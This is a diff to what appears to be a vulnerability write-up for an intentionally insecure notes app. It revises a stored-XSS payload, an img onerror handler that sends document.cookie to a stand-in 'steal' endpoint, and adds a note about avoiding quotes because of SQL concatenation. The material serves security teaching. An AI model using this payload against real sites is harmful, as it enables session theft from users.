@@ -25,7 +25,7 @@ is viewed — by its author or, via IDOR, by anyone.
 Create a note with this body:
 
 ```html
-<img src=x onerror="fetch('https://example.com/steal?c='+encodeURIComponent(document.cookie))">
+<img src=x onerror="fetch(`https://example.com/steal?c=`+encodeURIComponent(document.cookie))">
 ```
 
 When the note is viewed the image fails to load, the `onerror` handler runs, and
@@ -33,6 +33,10 @@ because the session cookie is **not** `HttpOnly` (see the broken-auth writeup)
 it is sent to the attacker. `<svg onload=...>` works the same way. Injected
 `<script>` tags do not auto-execute via `innerHTML`, which is why the payload
 uses an event handler.
+
+(The body is also concatenated into a single-quoted SQL string, so the payload
+avoids single quotes — backticks stand in for the string delimiters. A real
+attacker would just as easily use `String.fromCharCode` or an external script.)
 
 Runnable version: [`docs/exploits/stored-xss.http`](../exploits/stored-xss.http).
 
